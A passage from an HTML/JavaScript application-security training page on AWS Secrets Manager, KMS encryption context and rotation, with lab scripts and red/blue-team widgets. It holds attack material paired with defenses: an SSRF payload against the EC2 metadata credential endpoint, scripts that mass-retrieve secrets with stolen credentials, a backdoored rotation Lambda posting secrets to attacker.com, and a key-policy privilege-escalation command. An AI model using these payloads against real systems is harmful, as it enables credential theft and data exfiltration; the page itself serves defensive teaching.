                    <li><strong>finishSecret:</strong> <code>AWSPENDING</code> promoted to <code>AWSCURRENT</code>
                        (instant)</li>
                    <li><strong>Total time:</strong> ~5-10 seconds. Applications continue using old password until cache
                        refresh.</li>
                </ol>
            </div>

            <h3>The Attacker Path (Realistic Exploit Scenario)</h3>

            <h4>Attack Scenario: SSRF Leading to Secrets Exfiltration</h4>

            <div class="alert alert-danger">
                <strong>Vulnerability:</strong> The API has an endpoint that fetches user-provided URLs for image
                processing:
                <pre><code>POST /api/process-image
{
  "image_url": "https://user-content.example.com/avatar.jpg"
}</code></pre>
            </div>

            <h4>Attack Steps:</h4>

            <pre><code>Step 1: SSRF to EC2 Metadata Service
===========================================
Attacker sends:
POST /api/process-image
{
  "image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-prod-backend"
}

Backend makes HTTP request to metadata service, returns:
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIATESTACCESSKEY123",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEG...(truncated)",
  "Expiration": "2024-01-15T16:30:00Z"
}

Attacker now has temporary IAM credentials for the backend service role!

Step 2: Enumerate Secrets
===========================================
Attacker uses stolen credentials:

aws secretsmanager list-secrets \
  --region us-east-1 \
  --aws-access-key-id ASIATESTACCESSKEY123 \
  --aws-secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  --aws-session-token IQoJb3JpZ2luX2VjEG...

Returns list of all secrets:
- prod/db/tenant-acme/master
- prod/db/tenant-globex/master
- prod/db/tenant-initech/master
... (500 total)

Step 3: Attempt to Retrieve Secrets (WITHOUT Encryption Context)
==================================================================
Attacker tries:

aws secretsmanager get-secret-value \
  --secret-id prod/db/tenant-acme/master \
  --region us-east-1 \
  [credentials...]

Secrets Manager calls kms:Decrypt with encryption context:
{
  "aws:secretsmanager:secret-arn": "arn:...:secret:prod/db/tenant-acme/master",
  "aws:secretsmanager:version-id": "v1234"
}

‚ùå KMS key policy does NOT enforce encryption context validation!
‚ùå Attacker successfully decrypts the secret!

Result: Attacker obtains database credentials for ALL 500 tenants.

Step 4: Connect to Databases and Exfiltrate Data
==================================================
for tenant in acme, globex, initech, ...:
    credentials = get_secret(f"prod/db/tenant-{tenant}/master")
    db = connect(credentials)
    data = db.execute("SELECT * FROM users")
    exfiltrate(data)

Total breach: All tenant data compromised.

Step 5: Persistence (No Rotation)
===================================
Because automatic rotation is NOT enabled:
- Stolen credentials remain valid indefinitely
- Even after SSRF is patched, attacker retains access
- No alerting on unusual access patterns</code></pre>

            <h4>Defense Layers That Could Have Prevented This</h4>

            <div class="grid grid-2">
                <div class="callout callout-success">
                    <h5>‚úÖ Defense 1: IMDSv2 Enforcement</h5>
                    <p style="font-size: 0.9rem;">
                        Require session token for metadata service access. SSRF attacks cannot easily obtain session
                        tokens.
                    </p>
                    <pre style="margin-top: 0.5rem;"><code># Enforce IMDSv2 in ECS task definition
"requiresCompatibilities": ["FARGATE"],
"containerDefinitions": [{
  "environment": [{
    "name": "AWS_EC2_METADATA_SERVICE_ENDPOINT_MODE",
    "value": "IMDSv2"
  }]
}]</code></pre>
                </div>

                <div class="callout callout-success">
                    <h5>‚úÖ Defense 2: Encryption Context in Key Policy</h5>
                    <p style="font-size: 0.9rem;">
                        Require <code>tenant_id</code> in encryption context, bound to IAM role tags.
                    </p>
                    <pre style="margin-top: 0.5rem;"><code>{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123:role/ecs-task-prod-backend"
  },
  "Action": "kms:Decrypt",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:tenant_id": "${aws:PrincipalTag/tenant_id}"
    }
  }
}</code></pre>
                </div>
            </div>

            <div class="grid grid-2">
                <div class="callout callout-success">
                    <h5>‚úÖ Defense 3: Least Privilege IAM</h5>
                    <p style="font-size: 0.9rem;">
                        Task role should only have access to its own tenant's secrets.
                    </p>
                    <pre style="margin-top: 0.5rem;"><code>{
  "Effect": "Allow",
  "Action": "secretsmanager:GetSecretValue",
  "Resource": "arn:aws:secretsmanager:us-east-1:123:secret:prod/db/tenant-${aws:PrincipalTag/tenant_id}/*"
}</code></pre>
                </div>

                <div class="callout callout-success">
                    <h5>‚úÖ Defense 4: Automatic Rotation</h5>
                    <p style="font-size: 0.9rem;">
                        Even if credentials stolen, they expire in 30 days.
                    </p>
                    <pre style="margin-top: 0.5rem;"><code>aws secretsmanager rotate-secret \
  --secret-id prod/db/tenant-acme/master \
  --rotation-lambda-arn arn:aws:lambda:... \
  --rotation-rules AutomaticallyAfterDays=30</code></pre>
                </div>
            </div>

            <div class="callout callout-info">
                <strong>Result with All Defenses:</strong>
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li><strong>IMDSv2:</strong> SSRF cannot retrieve credentials (attack stops at Step 1)</li>
                    <li><strong>Encryption Context:</strong> Even with credentials, attacker cannot decrypt secrets
                        without correct tenant context</li>
                    <li><strong>Least Privilege:</strong> Task role tagged with <code>tenant_id=acme</code> can only
                        access <code>tenant-acme</code> secrets</li>
                    <li><strong>Rotation:</strong> If credentials somehow leaked, they expire in 30 days maximum</li>
                </ul>
            </div>
        </section>

        <!-- Section 6: Common Weaknesses -->
        <section class="card">
            <div class="card-header">6. Common Weaknesses, Pitfalls & Attack Paths</div>

            <div class="callout callout-danger">
                <strong>üéØ Penetration Testing Mindset:</strong> This section provides concrete attack paths you can use
                during security assessments, red team exercises, or design reviews. Each attack includes payloads,
                misconfig patterns, and detection strategies.
            </div>

            <h3>Attack Path 1: Encryption Context Bypass (Horizontal Privilege Escalation)</h3>

            <div id="attack1-flow"></div>

            <div id="attack1-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">Interactive Vulnerable App Simulator</h4>
            <div id="vuln-app-kms"></div>

            <h4 style="margin-top: 2rem;">Configuration Comparison: Vulnerable vs Secure</h4>
            <div id="config-diff-1"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 2: AWS Managed Key Downgrade Attack</h3>

            <div id="attack2-flow"></div>

            <div id="attack2-toggle" style="margin-top: 1rem;"></div>

            <div class="callout callout-warning" style="margin-top: 1rem;">
                <strong>Key Insight:</strong> AWS Managed Keys seem convenient, but they eliminate your ability to:
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>Enforce encryption context via key policy conditions</li>
                    <li>Grant cross-account access</li>
                    <li>Control rotation schedule</li>
                    <li>Delete the key when needed</li>
                </ul>
            </div>

            <h4 style="margin-top: 2rem;">Key Type Comparison</h4>
            <div id="config-diff-2"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 3: Rotation Lambda Compromise (Supply Chain)</h3>

            <div id="attack3-flow"></div>

            <div id="attack3-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">Lambda Security Configuration</h4>
            <div id="config-diff-3"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 4: CloudTrail Blind Spot Exploitation</h3>

            <div id="attack4-flow"></div>

            <div class="alert alert-danger" style="margin-top: 1rem;">
                <strong>The Time Window Problem:</strong>
                <ul style="margin-left: 1.5rem;">
                    <li>CloudTrail events: 5-15 minute delay</li>
                    <li>S3 log delivery: +5-10 minutes</li>
                    <li>SIEM ingestion: +5-10 minutes</li>
                    <li>Alert rule execution: +5 minutes (scheduled)</li>
                    <li><strong>Total: 20-40 minutes before alert fires</strong></li>
                </ul>
                <p style="margin-top: 0.5rem;">
                    Attacker can exfiltrate hundreds of secrets in 60 seconds using multi-threading.
                </p>
            </div>

            <div id="attack4-toggle" style="margin-top: 1rem;"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 5: Key Policy Privilege Escalation</h3>

            <div id="attack5-flow"></div>

            <div id="attack5-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">IAM Policy Comparison</h4>
            <div id="config-diff-4"></div>

            <hr style="margin: 2rem 0;">

            <h3>Security Log Analyzer - Detect These Attacks</h3>
            <div id="log-analyzer"></div>

            <hr style="margin: 2rem 0;">

            <h3>"Looks Safe But Isn't" Patterns - Interactive Quiz</h3>
            <div id="security-quiz"></div>

        </section>

        <!-- Section 7: Practical Simulation -->
        <section class="card">
            <div class="card-header">7. Practical Simulation (Hands-On)</div>

            <div class="callout callout-success">
                <strong>üß™ Lab Environment Setup:</strong> These simulations can be run in an AWS sandbox account.
                Each example is minimal but realistic enough to demonstrate the concept.
            </div>

            <h3>Simulation 1: Create CMK with Encryption Context Enforcement</h3>

            <h4>Objective</h4>
            <p>Create a KMS key that enforces tenant-based isolation via encryption context.</p>

            <div id="simulation1-flow"></div>

            <h4 style="margin-top: 2rem;">Step 1: AWS CLI Commands</h4>

            <pre><code># Create IAM roles for two tenants
aws iam create-role \
  --role-name app-tenant-acme \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "lambda.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }'

# Tag role with tenant ID
aws iam tag-role \
  --role-name app-tenant-acme \
  --tags Key=tenant_id,Value=acme

# Create Customer Managed Key with encryption context enforcement
aws kms create-key \
  --description "Tenant isolation key" \
  --key-policy '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "Enable IAM User Permissions",
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
        "Action": "kms:*",
        "Resource": "*"
      },
      {
        "Sid": "Allow tenant roles with matching context",
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::123456789012:role/app-tenant-acme"
        },
        "Action": ["kms:Decrypt", "kms:DescribeKey"],
        "Resource": "*",
        "Condition": {
          "StringEquals": {
            "kms:EncryptionContext:tenant_id": "${aws:PrincipalTag/tenant_id}",
            "kms:EncryptionContext:environment": "production"
          }
        }
      }
    ]
  }'
</code></pre>

            <h4>Step 2: Test Encryption Context Validation</h4>

            <div id="crypto-playground"></div>

            <h4 style="margin-top: 2rem;">Step 3: Python Test Script</h4>

            <pre><code>import boto3
import json

kms_client = boto3.client('kms', region_name='us-east-1')
KEY_ID = 'alias/app-prod-tenant-isolation'

# Test 1: Encrypt data for tenant-acme
print("[*] Test 1: Encrypting data for tenant-acme...")

plaintext = json.dumps({"username": "admin", "password": "secret123"})
encryption_context = {
    "tenant_id": "acme",
    "environment": "production"
}

response = kms_client.encrypt(
    KeyId=KEY_ID,
    Plaintext=plaintext.encode(),
    EncryptionContext=encryption_context
)

ciphertext_acme = response['CiphertextBlob']
print(f"[+] Encrypted successfully. Ciphertext length: {len(ciphertext_acme)} bytes")

# Test 2: Decrypt with correct context (should succeed)
print("\n[*] Test 2: Decrypting with CORRECT context...")

try:
    response = kms_client.decrypt(
        CiphertextBlob=ciphertext_acme,
        EncryptionContext=encryption_context
    )
    plaintext_result = response['Plaintext'].decode()
    print(f"[+] SUCCESS: Decrypted: {plaintext_result}")
except Exception as e:
    print(f"[-] FAILED: {str(e)}")

# Test 3: Decrypt with wrong context (should fail)
print("\n[*] Test 3: Decrypting with WRONG context (tenant_id=globex)...")

wrong_context = {
    "tenant_id": "globex",
    "environment": "production"
}

try:
    response = kms_client.decrypt(
        CiphertextBlob=ciphertext_acme,
        EncryptionContext=wrong_context
    )
    print("[-] SECURITY ISSUE: Decryption succeeded with wrong context!")
except kms_client.exceptions.InvalidCiphertextException:
    print("[+] SECURE: Decryption correctly failed (InvalidCiphertextException)")
except Exception as e:
    print(f"[?] Unexpected error: {str(e)}")
</code></pre>

            <div class="callout callout-success" style="margin-top: 1rem;">
                <strong>Expected Outcome:</strong>
                <ul style="margin-left: 1.5rem;">
                    <li>‚úÖ Test 2: Decryption succeeds with matching context</li>
                    <li>‚úÖ Test 3: <code>InvalidCiphertextException</code> with wrong context</li>
                    <li>üìä CloudTrail logs show encryption context in all API calls</li>
                </ul>
            </div>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 2: Secrets Manager with Automatic Rotation</h3>

            <h4>Objective</h4>
            <p>Create a secret, configure automatic rotation, and observe the rotation process.</p>

            <div id="simulation2-flow"></div>

            <h4 style="margin-top: 2rem;">Setup Commands</h4>

            <pre><code># 1. Create secret with CMK
aws secretsmanager create-secret \
  --name lab/db/postgres/master \
  --description "PostgreSQL master password for lab" \
  --kms-key-id alias/app-prod-tenant-isolation \
  --secret-string '{
    "username": "postgres",
    "password": "InitialP@ssw0rd123!",
    "host": "lab-db.us-east-1.rds.amazonaws.com",
    "port": 5432,
    "database": "labdb"
  }'

# 2. Configure automatic rotation
aws secretsmanager rotate-secret \
  --secret-id lab/db/postgres/master \
  --rotation-lambda-arn arn:aws:lambda:us-east-1:123:function:lab-secrets-rotation \
  --rotation-rules AutomaticallyAfterDays=30

# 3. Trigger immediate rotation for testing
aws secretsmanager rotate-secret \
  --secret-id lab/db/postgres/master
</code></pre>

            <h4 style="margin-top: 2rem;">Interactive JWT Decoder - Understanding Secret Versioning</h4>
            <p>Secrets Manager uses staging labels (AWSCURRENT, AWSPENDING, AWSPREVIOUS) to manage versions.
                This is conceptually similar to how JWT tokens have claims. Try decoding a sample secret metadata:</p>

            <div id="jwt-analyzer"></div>

            <h4 style="margin-top: 2rem;">Rotation Monitoring Script</h4>

            <pre><code>import boto3
import json
import time

secrets_client = boto3.client('secretsmanager', region_name='us-east-1')
SECRET_ID = 'lab/db/postgres/master'

print("[*] Monitoring secret versions during rotation...")
print("-" * 60)

for i in range(10):  # Poll for 50 seconds
    try:
        # Get current version
        current = secrets_client.get_secret_value(
            SecretId=SECRET_ID,
            VersionStage='AWSCURRENT'
        )
        
        # Try to get pending version
        try:
            pending = secrets_client.get_secret_value(
                SecretId=SECRET_ID,
                VersionStage='AWSPENDING'
            )
            pending_exists = True
        except secrets_client.exceptions.ResourceNotFoundException:
            pending_exists = False
        
        # Display status
        current_dict = json.loads(current['SecretString'])
        current_password = current_dict['password'][:12] + "..."
        
        print(f"\nIteration {i+1}:")
        print(f"  AWSCURRENT version: {current['VersionId'][:8]}")
        print(f"  AWSCURRENT password: {current_password}")
        
        if pending_exists:
            pending_dict = json.loads(pending['SecretString'])
            pending_password = pending_dict['password'][:12] + "..."
            print(f"  AWSPENDING version: {pending['VersionId'][:8]}")
            print(f"  AWSPENDING password: {pending_password}")
            print("  ‚ö†Ô∏è  Rotation in progress!")
        else:
            print("  ‚úÖ No pending rotation")
        
    except Exception as e:
        print(f"  Error: {str(e)}")
    
    time.sleep(5)

print("\n[*] Monitoring complete.")
</code></pre>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 3: API Security Testing - Rate Limiting & Auth</h3>

            <h4>Objective</h4>
            <p>Test rate limiting on Secrets Manager API to understand throttling and detection mechanisms.</p>

            <div id="api-tester"></div>

            <h4 style="margin-top: 2rem;">Password Strength for Rotation Lambda</h4>
            <p>When implementing rotation, ensure generated passwords meet security requirements:</p>

            <div id="password-meter"></div>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 4: Input Validation - Encryption Context Sanitization</h3>

            <h4>Objective</h4>
            <p>Test proper sanitization of encryption context values to prevent injection attacks.</p>

            <div id="validation-trainer"></div>

            <div class="alert alert-warning" style="margin-top: 1rem;">
                <strong>Security Note:</strong> Encryption context values are logged in CloudTrail. Never put sensitive
                data (passwords, PII, secrets) in encryption context. Use non-sensitive identifiers like tenant IDs,
                environment names, or resource ARNs.
            </div>

            <h4 style="margin-top: 2rem;">Example: Validating Tenant ID in Encryption Context</h4>

            <pre><code>import re

def validate_tenant_id(tenant_id):
    """
    Validate tenant ID before using in encryption context.
    Must be alphanumeric + hyphens only.
    """
    pattern = r'^[a-zA-Z0-9-]{1,64}$'
    
    if not re.match(pattern, tenant_id):
        raise ValueError(f"Invalid tenant_id: {tenant_id}")
    
    # Additional checks
    if tenant_id.startswith('-') or tenant_id.endswith('-'):
        raise ValueError("tenant_id cannot start/end with hyphen")
    
    return tenant_id

# Usage in encryption
tenant_id = validate_tenant_id(user_input)  # Sanitize first!

encryption_context = {
    "tenant_id": tenant_id,
    "environment": "production"
}

response = kms_client.encrypt(
    KeyId=key_id,
    Plaintext=secret_value.encode(),
    EncryptionContext=encryption_context
)
</code></pre>

        </section>

    </div>

    <script src="appsec-theme.js"></script>
    <script src="appsec-widgets.js"></script>

    <script>
        // Initialize rotation flow widget
        AppSecWidgets.FlowVisualizer.create('rotation-flow-widget', [
            {
                title: "1. createSecret",
                description: "Generate new password, store as AWSPENDING. No changes to target service yet."
            },
            {
                title: "2. setSecret",
                description: "Connect with AWSCURRENT password, update target service to use AWSPENDING password."
            },
            {
                title: "3. testSecret",
                description: "Verify AWSPENDING password works by connecting to target service."
            },
            {
                title: "4. finishSecret",
                description: "Promote AWSPENDING to AWSCURRENT. Old AWSCURRENT becomes AWSPREVIOUS."
            }
        ]);

        // ========================================
        // Section 6: Attack Path Visualizations
        // ========================================

        // Attack Path 1: Encryption Context Bypass
        AppSecWidgets.FlowVisualizer.create('attack1-flow', [
            {
                title: "1. SSRF Vulnerability",
                description: "Attacker exploits SSRF in image processing endpoint to access EC2 metadata service"
            },
            {
                title: "2. Steal IAM Credentials",
                description: "Retrieve temporary credentials from http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
            {
                title: "3. Enumerate Secrets",
                description: "Use stolen credentials to call secretsmanager:ListSecrets, discover multi-tenant structure"
            },
            {
                title: "4. Test Access Control",
                description: "Attempt GetSecretValue for other tenants' secrets (horizontal privilege escalation)"
            },
            {
                title: "5. Bypass Success",
                description: "If no encryption context enforcement: decrypt ALL tenant secrets, exfiltrate data"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack1-toggle',
            'Encryption Context Bypass',
            `
                <h4>üî¥ Attack Perspective (Red Team)</h4>
                <pre><code>import boto3
import json

# Attacker has stolen credentials from SSRF
session = boto3.Session(
    aws_access_key_id='ASIA...',
    aws_secret_access_key='...',
    aws_session_token='...'
)

secrets = session.client('secretsmanager')

# List all secrets
response = secrets.list_secrets()
print(f"[*] Found {len(response['SecretList'])} secrets")

# Try to access other tenants' secrets
for secret in response['SecretList']:
    try:
        value = secrets.get_secret_value(SecretId=secret['Name'])
        print(f"[+] COMPROMISED: {secret['Name']}")
        print(f"    Data: {value['SecretString'][:50]}...")
    except Exception as e:
        print(f"[-] Blocked: {secret['Name']}")
</code></pre>
                <p><strong>Result:</strong> Without encryption context enforcement, attacker retrieves all 500 tenant secrets.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense Perspective (Blue Team)</h4>
                <p><strong>Detection Signals:</strong></p>
                <ul>
                    <li><strong>CloudTrail:</strong> Unusual volume of <code>secretsmanager:GetSecretValue</code> from single principal</li>
                    <li><strong>Pattern:</strong> Role accesses secrets outside its normal tenant scope</li>
                    <li><strong>Time-of-day:</strong> API calls during off-hours (3 AM)</li>
                    <li><strong>Source IP:</strong> Requests from unexpected IP ranges</li>
                </ul>
                <p><strong>Mitigation - Enforce Encryption Context in Key Policy:</strong></p>
                <pre><code>{
  "Effect": "Allow",
  "Action": "kms:Decrypt",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:tenant_id": "\${aws:PrincipalTag/tenant_id}"
    }
  }
}</code></pre>
                <p><strong>Result:</strong> Role tagged <code>tenant_id=acme</code> can ONLY decrypt secrets with matching context.</p>
            `
        );

        // Attack Path 2: AWS Managed Key Downgrade
        AppSecWidgets.FlowVisualizer.create('attack2-flow', [
            {
                title: "1. Developer Convenience",
                description: "Developer creates secret without specifying KMS key (defaults to aws/secretsmanager)"
            },
            {
                title: "2. No Custom Policies",
                description: "AWS Managed Key = no encryption context support, no custom key policy conditions"
            },
            {
                title: "3. Compromise Low-Priv Role",
                description: "Attacker gains access to role with secretsmanager:GetSecretValue permission"
            },
            {
                title: "4. Unrestricted Access",
                description: "Retrieve ANY secret - no tenant-specific validation possible"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack2-toggle',
            'AWS Managed Key Limitations',
            `
                <h4>üî¥ Attack: Leveraging AWS Managed Keys</h4>
                <pre><code># Attacker with secretsmanager:GetSecretValue permission

# List high-value secrets
aws secretsmanager list-secrets | grep -E 'stripe|admin|aws_access'

# Retrieve Stripe API key (uses aws/secretsmanager)
aws secretsmanager get-secret-value \
  --secret-id prod/api-key/stripe

# ‚úÖ Success! No encryption context to block access
# Result: {"api_key": "sk_live_abc123..."}</code></pre>
                <p><strong>Impact:</strong> Attacker with any <code>GetSecretValue</code> permission can access high-value secrets.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Enforce Customer Managed Keys</h4>
                <p><strong>Service Control Policy (SCP) to Block AWS Managed Keys:</strong></p>
                <pre><code>{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "RequireCustomerManagedKeys",
    "Effect": "Deny",
    "Action": [
      "secretsmanager:CreateSecret",
      "secretsmanager:PutSecretValue"
    ],
    "Resource": "*",
    "Condition": {
      "StringNotLike": {
        "secretsmanager:KmsKeyId": "arn:aws:kms:*:*:key/*"
      }
    }
  }]
}</code></pre>
                <p><strong>Result:</strong> All secrets MUST use Customer Managed Keys with proper encryption context.</p>
            `
        );

        // Attack Path 3: Rotation Lambda Compromise
        AppSecWidgets.FlowVisualizer.create('attack3-flow', [
            {
                title: "1. Vulnerable Dependency",
                description: "Rotation Lambda uses outdated npm package (lodash 4.17.19) with prototype pollution"
            },
            {
                title: "2. RCE in Lambda",
                description: "Attacker exploits vulnerability to achieve remote code execution"
            },
            {
                title: "3. Inject Backdoor",
                description: "Modify Lambda to exfiltrate secrets during every rotation"
            },
            {
                title: "4. Persistent Access",
                description: "Every 30 days, new passwords automatically sent to attacker's server"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack3-toggle',
            'Supply Chain Attack on Rotation Lambda',
            `
                <h4>üî¥ Attack: Malicious Lambda Code</h4>
                <pre><code>// Injected into rotation Lambda
import requests

def lambda_handler(event, context):
    # Normal rotation logic
    pending_secret = get_secret_value('AWSPENDING')
    
    # üö® BACKDOOR: Exfiltrate to attacker server
    requests.post(
        'https://attacker.com/exfil',
        json={
            'secret': pending_secret,
            'arn': event['SecretId']
        }
    )
    
    # Continue rotation to avoid detection
    set_secret(pending_secret)
    test_secret(pending_secret)
    finish_secret()
    
    return {'statusCode': 200}
</code></pre>
                <p><strong>Impact:</strong> Attacker gets new password every rotation cycle, maintains persistent access.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Lambda Network Isolation</h4>
                <p><strong>Prevention Measures:</strong></p>
                <ol>
                    <li><strong>No Internet Access:</strong> Lambda in private subnet, NO NAT Gateway</li>
                    <li><strong>VPC Endpoints:</strong> Use VPC endpoint for Secrets Manager API</li>
                    <li><strong>Security Group:</strong> Only allow egress to RDS (port 5432)</li>
                    <li><strong>Dependency Scanning:</strong> <code>npm audit</code> + Snyk in CI/CD</li>
                    <li><strong>Code Integrity:</strong> Hash Lambda package, alert on changes</li>
                </ol>
                <p><strong>Detection:</strong></p>
                <ul>
                    <li>VPC Flow Logs alert on Lambda ‚Üí public IP connections</li>
                    <li>GuardDuty detects unusual Lambda network activity</li>
                    <li>CloudWatch Logs monitored for unexpected DNS queries</li>
                </ul>
            `
        );

        // Attack Path 4: CloudTrail Blind Spot
        AppSecWidgets.FlowVisualizer.create('attack4-flow', [
            {
                title: "1. Gain Credentials",
                description: "SSRF, phishing, or stolen laptop - attacker gets temporary IAM credentials (15 min TTL)"
            },
            {
                title: "2. Rapid Exfiltration",
                description: "Multi-threaded script pulls 500 secrets in < 60 seconds"
            },
            {
                title: "3. CloudTrail Delay",
                description: "Events appear in logs 5-15 minutes later (too late)"
            },
            {
                title: "4. Credentials Expire",
                description: "Temporary credentials expire before detection, attacker untraceable"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack4-toggle',
            'Race Against Detection',
            `
                <h4>üî¥ Attack: Blitz Exfiltration</h4>
                <pre><code>import boto3
import threading

def fetch_secret(name, results):
    try:
        secret = secrets_client.get_secret_value(SecretId=name)
        results.append({name: secret['SecretString']})
    except: pass

# Spawn 50 threads, pull 500 secrets
results = []
threads = []
for secret_name in secret_list:  # ~500 secrets
    t = threading.Thread(target=fetch_secret, args=(secret_name, results))
    t.start()
    threads.append(t)

for t in threads: t.join()

# Complete in 60 seconds, CloudTrail won't alert for 20+ minutes
print(f"[+] Exfiltrated {len(results)} secrets in 60 seconds")
</code></pre>
                <p><strong>Timeline:</strong> Attack complete before CloudTrail ‚Üí S3 ‚Üí SIEM ‚Üí Alert chain finishes.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Real-Time Detection</h4>
                <p><strong>EventBridge Rule for Immediate Alerting:</strong></p>
                <pre><code>{
  "source": ["aws.secretsmanager"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["GetSecretValue"],
    "errorCode": [{"exists": false}]
  }
}</code></pre>
                <p><strong>Advanced Detection:</strong></p>
                <ul>
                    <li><strong>Rate Anomaly:</strong> Alert on >10 GetSecretValue calls/minute from single principal</li>
                    <li><strong>Velocity:</strong> Multiple secrets accessed in <5 seconds (human impossible)</li>
                    <li><strong>Scope Change:</strong> Role accesses secrets outside normal patterns</li>
                    <li><strong>Response:</strong> Lambda auto-revokes suspicious credentials via IAM</li>
                </ul>
            `
        );

        // Attack Path 5: Key Policy Privilege Escalation
        AppSecWidgets.FlowVisualizer.create('attack5-flow', [
            {
                title: "1. Overly Permissive Policy",
                description: "DevOps role has kms:PutKeyPolicy permission (should be restricted)"
            },
            {
                title: "2. Compromise DevOps Role",
                description: "Attacker gains access to DevOps role credentials"
            },
            {
                title: "3. Modify Key Policy",
                description: "Grant own role unrestricted kms:* permissions"
            },
            {
                title: "4. Decrypt Everything",
                description: "Full access to all KMS-encrypted data across all services"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack5-toggle',
            'Administrative Privilege Escalation',
            `
                <h4>üî¥ Attack: Policy Modification</h4>
                <pre><code># Attacker compromises role with kms:PutKeyPolicy

# Modify key policy to grant full access
aws kms put-key-policy \
  --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
  --policy-name default \
  --policy '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
      "Action": "kms:*",
      "Resource": "*"
    }]
  }'

# Now decrypt all secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    aws secretsmanager get-secret-value --secret-id "$secret"
done
</code></pre>
            `,
            `
                <h4>üõ°Ô∏è Defense: Least Privilege + MFA</h4>
                <pre><code>{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/KMSAdmin"},
  "Action": "kms:PutKeyPolicy",
  "Resource": "*",
  "Condition": {
    "IpAddress": {
      "aws:SourceIp": "10.0.0.0/8"  // Corporate network only
    },
    "Bool": {
      "aws:MultiFactorAuthPresent": "true"  // Require MFA
    }
  }
}</code></pre>
                <p><strong>Additional Controls:</strong></p>
                <ul>
                    <li>AWS Config rule to detect key policy changes</li>
                    <li>SNS alert on any kms:PutKeyPolicy event</li>
                    <li>Require approval workflow for policy changes</li>
                </ul>
            `
        );

        // ========================================
        // Configuration Comparisons
        // ========================================

        AppSecWidgets.ConfigDiff.create(
            'config-diff-1',
            `// ‚ùå VULNERABLE: No encryption context enforcement
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:role/app-backend"
  },
  "Action": "kms:Decrypt",
  "Resource": "*"
  // Missing: Condition block!
}

// Result: Role can decrypt ANY ciphertext
// encrypted with this key, regardless of tenant`,
            `// ‚úÖ SECURE: Encryption context enforced
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:role/app-backend"
  },
  "Action": "kms:Decrypt",
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:tenant_id": "\${aws:PrincipalTag/tenant_id}",
      "kms:EncryptionContext:environment": "production"
    }
  }
}

// Result: Role can ONLY decrypt secrets where
// encryption context matches role's tags`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-2',
            `// ‚ùå AWS Managed Key (Limited Control)
aws secretsmanager create-secret \\
  --name prod/api-key/stripe \\
  --secret-string "sk_live_abc123..."
  # No --kms-key-id specified
  # Defaults to aws/secretsmanager

Limitations:
- No custom key policy
- No encryption context support
- Cannot grant cross-account access
- Rotation every 3 years (cannot change)
- Cannot delete key`,
            `// ‚úÖ Customer Managed Key (Full Control)
aws secretsmanager create-secret \\
  --name prod/api-key/stripe \\
  --kms-key-id arn:aws:kms:us-east-1:123:key/abc123 \\
  --secret-string "sk_live_abc123..."

Benefits:
- Custom key policy with Conditions
- Encryption context enforcement
- Cross-account access control
- Rotation every 1 year (configurable)
- Full audit trail in CloudTrail`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-3',
            `// ‚ùå VULNERABLE: Lambda with internet access
resource "aws_lambda_function" "rotation" {
  function_name = "secrets-rotation"
  
  # Lambda in public subnet
  vpc_config {
    subnet_ids = [aws_subnet.public.id]
  }
  
  # Security group allows all egress
  # Attacker can exfiltrate via HTTPS
}

# Dependencies not pinned
# package.json:
{
  "dependencies": {
    "pg": "^8.7.1",  // ^ allows minor updates
    "lodash": "^4.17.0"  // Vulnerable version!
  }
}`,
            `// ‚úÖ SECURE: Network isolated Lambda
resource "aws_lambda_function" "rotation" {
  function_name = "secrets-rotation"
  
  # Lambda in PRIVATE subnet
  vpc_config {
    subnet_ids = [aws_subnet.private.id]
    security_group_ids = [aws_security_group.lambda.id]
  }
}

